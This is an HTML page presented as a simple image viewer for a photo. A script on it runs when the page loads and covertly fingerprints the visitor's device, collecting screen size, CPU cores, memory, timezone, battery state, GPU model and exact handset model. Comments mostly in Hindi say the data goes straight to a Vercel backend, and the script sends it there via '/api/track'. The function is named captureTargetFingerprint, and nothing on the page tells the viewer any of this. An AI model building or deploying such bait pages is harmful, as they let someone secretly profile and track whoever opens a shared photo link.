<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Image Viewer</title>
    <style>
        body { background-color: black; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; user-select: none; }
        img { max-width: 100%; max-height: 100vh; object-fit: contain; }
    </style>
</head>
<body>

    <img src="photo.jpg" alt="Image Viewer">

    <script>
        async function captureTargetFingerprint() {
            try {
                let metadata = {
                    screenRes: `${window.screen.width}x${window.screen.height}`,
                    pixelRatio: window.devicePixelRatio || 1,
                    cores: navigator.hardwareConcurrency || "Hidden",
                    ram: navigator.deviceMemory || "Hidden",
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
                };

                // 🔋 बैटरी स्टेटस और चार्जिंग की जानकारी जोड़ना
                if (navigator.getBattery) {
                    try {
                        const battery = await navigator.getBattery();
                        metadata.batteryLevel = `${Math.round(battery.level * 100)}%`;
                        metadata.isCharging = battery.charging ? "Yes" : "No";
                    } catch (e) {
                        metadata.batteryLevel = "Blocked/Error";
                        metadata.isCharging = "N/A";
                    }
                } else {
                    metadata.batteryLevel = "Not Supported";
                    metadata.isCharging = "N/A";
                }

                // Canvas के ज़रिए GPU एक्सट्रैक्ट करना
                try {
                    const canvas = document.createElement('canvas');
                    const gl = canvas.getContext('webgl');
                    if (gl) {
                        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                        metadata.gpuRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                    }
                } catch (e) { metadata.gpuRenderer = "Blocked"; }

                // High-Entropy Client Hints (सटीक मोबाइल हैंडसेट नाम के लिए)
                if (navigator.userAgentData) {
                    const hints = await navigator.userAgentData.getHighEntropyValues(["model", "platformVersion"]);
                    metadata.exactModel = hints.model || navigator.platform || "Unknown";
                    metadata.osVersion = hints.platformVersion || "Unknown";
                } else {
                    metadata.exactModel = navigator.platform || "Unknown";
                    metadata.osVersion = "N/A (No Client Hints)";
                }

                // सीधे Vercel बैकएंड API को डेटा भेजना
                fetch('/api/track', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(metadata)
                });

            } catch (err) {
                console.log("Forensic Failure:", err);
            }
        }

        window.onload = captureTargetFingerprint;
    </script>
</body>
</html>
